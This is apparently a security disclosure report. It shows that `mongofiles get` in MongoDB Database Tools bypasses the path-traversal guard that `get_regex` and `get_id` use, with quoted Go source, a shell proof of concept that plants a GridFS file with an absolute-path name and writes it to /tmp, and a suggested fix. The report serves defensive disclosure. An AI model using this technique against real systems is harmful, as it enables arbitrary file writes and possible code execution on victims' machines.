# Title

`mongofiles get` bypasses the path-traversal / arbitrary-file-write guard that `get_regex` and `get_id` enforce (Database Tools, `mongodb/mongo-tools`)

## Summary

`mongofiles` (part of the MongoDB Database Tools) writes GridFS content to the local
filesystem using the `filename` field stored in the `fs.files` document — a value that is
entirely attacker-controlled by anyone who can insert into, or has previously inserted into,
the target GridFS bucket. The tool already has a dedicated safeguard against this being abused
to write outside the operator's working directory, but that safeguard is **only wired up for
`get_regex` and `get_id`**. The plain `mongofiles get <filename>` command — including its
multi-filename form — performs the exact same unsanitized local write with **no check at all**,
silently writing attacker-supplied content to any absolute path or `../`-traversal path the
attacker chose, with no warning and no opt-in flag required.

## Weakness

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') /
arbitrary file write via externally-controlled filename used without validation.

## Component / Version

- Repository: `mongodb/mongo-tools` (HackerOne scope: **Database Tools**)
- Tag audited: `100.18.0`
- Commit: [`21a342dfee6468ad9350d156d25086da64dd03b1`](https://github.com/mongodb/mongo-tools/commit/21a342dfee6468ad9350d156d25086da64dd03b1)
- Official binaries for this version: https://www.mongodb.com/try/download/database-tools

## Root cause, with links to the exact code

1. `mongofiles get <name...>` and `mongofiles put <name...>` both populate
   `mf.FileNameList` directly from the CLI positional arguments:
   [`mongofiles/mongofiles.go#L126-L133`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L126-L133)
   ```go
   case Put, Get:
       // monogofiles put ... and mongofiles get ... should work
       // over a list of files, i.e. by using mf.FileNameList
       if len(args) == 1 || args[1] == "" {
           return fmt.Errorf("%#q argument missing", args[0])
       }
       mf.FileNameList = args[1:]
   ```
   `get_regex` uses `mf.FileNameRegex` instead, and `get_id` uses `mf.Id` — neither of those
   commands ever populates `mf.FileNameList`.

2. The one place that guards against a database-supplied `filename` resolving outside the
   current directory is gated on that same variable being **empty**:
   [`mongofiles/mongofiles.go#L308-L340`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L308-L340)
   ```go
   if len(mf.FileNameList) == 0 {
       cwd, err := os.Getwd()
       ...
       for _, gf := range gridFiles {
           absPath, err := filepath.Abs(gf.Name)
           ...
           rel, err := filepath.Rel(cwd, absPath)
           ...
           if !filepath.IsLocal(rel) {
               if mf.StorageOptions.AllowUnsafeTraversal {
                   log.Logvf(log.Always, "WARNING: %#q lies outside the current directory. Restoring anyway per configuration.", gf.Name)
               } else {
                   return nil, fmt.Errorf("%#q lies outside the current directory; set --allowUnsafeTraversal if you really want to write to that path", gf.Name)
               }
           }
       }
   }
   ```
   This block is unreachable for `get <name>` / `get <name1> <name2> ...`, because
   `mf.FileNameList` is non-empty for that command by construction (step 1).

3. The eventual local write, reached identically from every `get*` variant, uses the raw
   database-sourced name with no further validation:
   [`getLocalFileName` — `mongofiles/mongofiles.go#L210-L220`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L210-L220)
   ```go
   func (mf *MongoFiles) getLocalFileName(gridFile *gfsFile) string {
       localFileName := mf.StorageOptions.LocalFileName
       if localFileName == "" {
           if gridFile != nil {
               localFileName = gridFile.Name   // <-- straight from the DB, unsanitized
           } else {
               localFileName = mf.FileName
           }
       }
       return localFileName
   }
   ```
   and
   [`writeGFSFileToLocal` — `mongofiles/mongofiles.go#L421-L465`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L421-L465)
   ```go
   func (mf *MongoFiles) writeGFSFileToLocal(gridFile *gfsFile) (err error) {
       localFileName := mf.getLocalFileName(gridFile)
       ...
       localFile, err = os.OpenFile(localFileName, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0o666)
       ...
   ```

4. This is a **regression against the project's own documented intent**, not an oversight I'm
   inferring — the safeguard's introducing commit says explicitly:

   > "When `get`ting files by either a **regular expression** or **ID**, and the filename
   > resolves to a path outside the current directory, mongofiles now refuses to restore the
   > files."
   — [`TOOLS-4019`, commit `77f52adb`](https://github.com/mongodb/mongo-tools/commit/77f52adb)

   A follow-up commit hardened the same check for Windows path separators and
   case-insensitive filesystems, but never extended its *scope* to plain `get`:
   [`TOOLS-4116`, commit `b4fc49f9`](https://github.com/mongodb/mongo-tools/commit/b4fc49f9)
   The `--allowUnsafeTraversal` flag's own docstring confirms the intended (too-narrow) scope:
   [`mongofiles/options.go#L111`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/options.go#L111)
   ```go
   AllowUnsafeTraversal bool `long:"allowUnsafeTraversal" description:"allow get_regex to download files with path separators"`
   ```

## Steps to Reproduce

Built from the exact `100.18.0` tag source (official binaries were not reachable from my test
environment; this build is source- and behavior-identical). Any standalone `mongod`, no auth
needed for the PoC itself — the finding is about the local write, not server-side access
control.

```sh
# 1. Attacker plants a GridFS file whose *stored* filename is an absolute path,
#    using any account with insert access to this GridFS bucket (shared/multi-tenant
#    DB, or via a dump the victim later restores/imports):
echo "PAYLOAD-CONTENT-FROM-ATTACKER" > payload.txt
mongofiles --db test put --local payload.txt '/tmp/mongofiles_poc_absolute.txt'
#  -> added gridFile: `/tmp/mongofiles_poc_absolute.txt`

# 2. Victim, in an unrelated, safe working directory, uses the *protected* command
#    first -- and it correctly refuses, exactly as designed:
cd /some/safe/dir
mongofiles --db test get_regex '.*'
#  -> Failed: `/tmp/mongofiles_poc_absolute.txt` lies outside the current directory;
#     set --allowUnsafeTraversal if you really want to write to that path

# 3. Victim uses the *unprotected* command for the identical stored file --
#    silent success, zero warning, zero flag required:
mongofiles --db test get '/tmp/mongofiles_poc_absolute.txt'
#  -> finished writing to `/tmp/mongofiles_poc_absolute.txt`
cat /tmp/mongofiles_poc_absolute.txt
#  -> PAYLOAD-CONTENT-FROM-ATTACKER
```

Also confirmed for the multi-filename form, mixing one legitimate name with the malicious one
in a single command (i.e. exactly what any "download this batch of files" script would do):

```sh
mongofiles --db test get 'report.csv' '/tmp/mongofiles_poc_multiname.txt'
#  -> finished writing to `/tmp/mongofiles_poc_multiname.txt`
#  -> finished writing to `report.csv`
```

Both writes succeed side by side with identical log formatting — nothing distinguishes the
malicious write from the legitimate one.

## Impact

An attacker with the ability to get one hostile `filename` value into a GridFS bucket that a
victim will later download from by name — via direct insert access to a shared/multi-tenant
database, via `mongofiles put` if they hold write access, or via a dump/import a victim restores
from an untrusted source — can cause **arbitrary local file creation with fully
attacker-controlled content** at any path the victim's OS account can write to, the moment the
victim runs `mongofiles get <name>` (single or multi-name) on it. This includes the natural,
commonly-scripted workflow of `mongofiles list` (which prints raw, unsanitized filenames with no
indication anything is wrong) followed by `get` on each discovered name — a pattern arguably more
likely to be automated than `get_regex`. Depending on the account running `mongofiles`, this can
lead to overwriting startup files, cron entries, or SSH `authorized_keys`, i.e. a path to full
code execution on the operator's machine — not merely a crash or disruption.

## Suggested Fix

Apply the identical `filepath.IsLocal`-based check unconditionally to every `gfsFile` about to
be written locally in `getTargetGFSFiles()`, regardless of whether it arrived via
`mf.FileNameList`, `mf.FileNameRegex`, or `mf.Id` — i.e. remove or invert the
`if len(mf.FileNameList) == 0` gate so `get` receives the exact protection `get_regex`/`get_id`
already have. `--allowUnsafeTraversal` already exists as the correct escape hatch and needs no
changes; it just needs to also cover the third case.

## Supporting Material

- Full write-up with additional detail: `security-research/mongo-tools/mongofiles-get-path-traversal-bypass-2026-08-30/README.md` (this repository)
- Guard (get_regex/get_id only): https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L308-L340
- FileNameList population (get/put): https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L126-L133
- Unsanitized local filename resolution: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L210-L220
- Unguarded local write: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/mongofiles.go#L421-L465
- `--allowUnsafeTraversal` flag, scope stated in its own docstring: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongofiles/options.go#L111
- Original safeguard (scoped to "regular expression or ID"): https://github.com/mongodb/mongo-tools/commit/77f52adb
- Follow-up hardening (still scoped the same way): https://github.com/mongodb/mongo-tools/commit/b4fc49f9
